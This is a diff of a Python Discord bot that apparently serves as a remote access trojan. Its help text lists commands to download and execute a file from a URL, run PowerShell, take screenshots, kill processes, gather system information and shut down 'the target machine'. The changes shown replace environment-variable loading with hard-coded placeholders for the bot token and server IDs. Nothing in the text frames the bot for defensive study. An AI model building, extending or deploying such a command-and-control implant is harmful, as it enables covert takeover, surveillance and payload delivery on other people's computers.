@@ -11,7 +11,6 @@ import webbrowser
 import psutil
 import discord
 from discord.ext import commands
-from dotenv import load_dotenv
 import io
 import pyautogui
 import requests
@@ -25,16 +24,12 @@ intents.guild_messages = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Load environment variables from .env file
-load_dotenv()
-
 async def on_ready():
-    # Retrieve the BOT_ACTIVITY environment variable
-    bot_activity = os.getenv('BOT_ACTIVITY')
-
     # Set the bot's activity
-    activity = discord.Activity(type=discord.ActivityType.listening, name=bot_activity)
+    activity = discord.Activity(type=discord.ActivityType.listening, name='Your activity') # Replace 'Your activity' with your desired activity text
+
     await bot.change_presence(activity=activity)
+
 
 # Command : Set Payload 
 @bot.command()
@@ -108,6 +103,7 @@ async def bot_info(ctx):
 async def clear(ctx, amount=5):
     await ctx.channel.purge(limit=amount)
 
+# Command : Bot Help
 @bot.command(name='bot_help')
 async def bot_help(ctx):
     help_message = """
@@ -120,7 +116,7 @@ async def bot_help(ctx):
 !set_payload <URL> - Download and execute a file from the provided URL
 !powershell - Execute a PowerShell command on the target machine
 !screenshot - Take a screenshot of the target machine's screen
-!list_process - Get a list of running processes on the target machine
+!get_process_list - Get a list of running processes on the target machine
 !kill_process <name> - Kill a specified process on the target machine
 !sys_info - Get information about the target machine's operating system
 !open_website <URL> - Open a specified URL on the target machine
@@ -332,9 +328,9 @@ async def sys_shutdown(ctx):
 async def send_system_active_message():
     await bot.wait_until_ready()
 
-    # Get channel and guild IDs from environment variables
-    guild_id = int(os.getenv('GUILD_ID'))
-    channel_id = int(os.getenv('CHANNEL_ID'))
+  # Set the guild ID and channel ID directly
+    guild_id = 1234567890  # Replace with your guild ID
+    channel_id = 1234567890  # Replace with your channel ID
 
     guild = bot.get_guild(guild_id)
     channel = guild.get_channel(channel_id)
@@ -347,4 +343,4 @@ async def send_system_active_message():
     except Exception as e:
         print(f"Error sending system active message: {e}")
 
-bot.run(os.getenv('BOT_TOKEN')) # Use the bot token from environment variable
+bot.run('Your_Bot_Token') # Replace 'your_bot_token' with your actual bot token
